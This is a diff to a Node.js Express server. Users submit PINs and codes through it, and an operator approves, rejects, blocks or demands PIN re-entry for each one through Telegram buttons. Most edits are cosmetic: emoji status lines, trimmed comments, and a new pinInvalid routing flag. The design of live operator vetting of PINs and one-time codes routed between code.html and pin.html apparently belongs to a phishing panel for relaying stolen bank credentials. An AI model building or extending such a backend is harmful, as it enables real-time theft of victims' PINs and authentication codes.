@@ -100,7 +100,6 @@ async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard 
             text,
             parse_mode: 'Markdown'
         };
-        // null / empty = remove buttons
         payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };
 
         await axios.post(
@@ -194,8 +193,7 @@ app.post('/submit-pin', (req, res) => {
     res.json({ requestId });
 });
 
-// ✅ MODIFIED: accepts POST (identity sent on each poll)
-//    also keeps GET for compatibility
+// ✅ accepts POST (identity sent on each poll), keeps GET too
 app.all('/check-pin/:requestId', (req, res) => {
     const requestId = req.params.requestId;
     if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
@@ -235,10 +233,12 @@ app.post('/submit-code', (req, res) => {
     res.json({ requestId });
 });
 
-// ✅ MODIFIED: accepts POST (identity sent on each poll)
-//    also keeps GET for compatibility
+// ✅ returns approved + pinInvalid so code.html can route to pin.html
 app.all('/check-code/:requestId', (req, res) => {
-    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
+    const requestId = req.params.requestId;
+    const approved = approvedCodes[requestId] ?? null;
+    const pinInvalid = approved === true && approvedPins[requestId] === false;
+    res.json({ approved, pinInvalid });
 });
 
 // ---------------- TELEGRAM WEBHOOK ----------------
@@ -249,7 +249,6 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
-    // Double-click protection
     if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
     processedCallbacks.add(cb.id);
     setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);
@@ -263,39 +262,38 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (action === 'pin_ok') {
         approvedPins[requestId] = true;
         persist();
-        feedback = 'PIN approved ✅';
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n✅ *APPROVED BY ADMIN*';
+        feedback = '🟢 PIN approved';
+        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *APPROVED BY ADMIN*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
     } else if (action === 'pin_bad') {
         approvedPins[requestId] = false;
         persist();
-        feedback = 'PIN rejected ❌';
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n❌ *REJECTED BY ADMIN*';
+        feedback = '🔴 PIN rejected';
+        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n❌ *REJECTED BY ADMIN*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
     } else if (action === 'pin_block') {
         blockPins[requestId] = true;
         persist();
-        feedback = 'User blocked 🛑';
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n🛑 *USER BLOCKED*';
+        feedback = '🔴 User blocked';
+        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n🛑 *USER BLOCKED*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
     } else if (action === 'code_ok') {
         approvedCodes[requestId] = true;
         persist();
-        feedback = 'Code approved ✅';
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n✅ *APPROVED BY ADMIN*';
+        feedback = '🟢 Code approved';
+        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *APPROVED BY ADMIN*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
     } else if (action === 'code_bad') {
         approvedCodes[requestId] = false;
         persist();
-        feedback = 'Code rejected ❌';
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n❌ *REJECTED BY ADMIN*';
+        feedback = '🔴 Code rejected';
+        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n❌ *REJECTED BY ADMIN*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
     } else if (action === 'code_pin') {
         approvedCodes[requestId] = true;
         approvedPins[requestId]  = false;
         persist();
-        feedback = 'Code approved – re-enter PIN';
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n✅ *CODE OK* — ⚠️ *PIN RE-ENTRY REQUIRED*';
+        feedback = '🟢 Code approved – re-enter PIN';
+        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *CODE OK* — ⚠️ *PIN RE-ENTRY REQUIRED*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
     } else {
-        statusLine = '\n\n━━━━━━━━━━━━━━━━━━━━\n⚠️ *UNKNOWN ACTION*';
+        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n⚠️ *UNKNOWN ACTION*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
     }
 
-    // 🔥 Edit the original message: append status + REMOVE buttons
     if (messageId && chatId && statusLine) {
         const originalText = cb.message.text || '';
         await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
@@ -312,11 +310,7 @@ app.get('/debug/bots', (req, res) => res.json(bots));
 // =====================================================
 //          KEEP-ALIVE (ANTI-SLEEP) SYSTEM
 // =====================================================
-// ⚠️ IMPORTANT: a sleeping server CANNOT wake itself up.
-// This self-ping ONLY works while the process is running.
-// ALSO use an external pinger (cron-job.org / UptimeRobot) on /health.
-
-const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000; // 10 minutes
+const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000;
 let keepAliveTimer = null;
 
 async function selfPing() {
@@ -342,7 +336,7 @@ function startKeepAlive() {
 }
 
 // =====================================================
-//      GLOBAL CRASH GUARDS (auto-recover process)
+//      GLOBAL CRASH GUARDS
 // =====================================================
 process.on('uncaughtException', (err) => {
     console.error('💥 uncaughtException:', err);
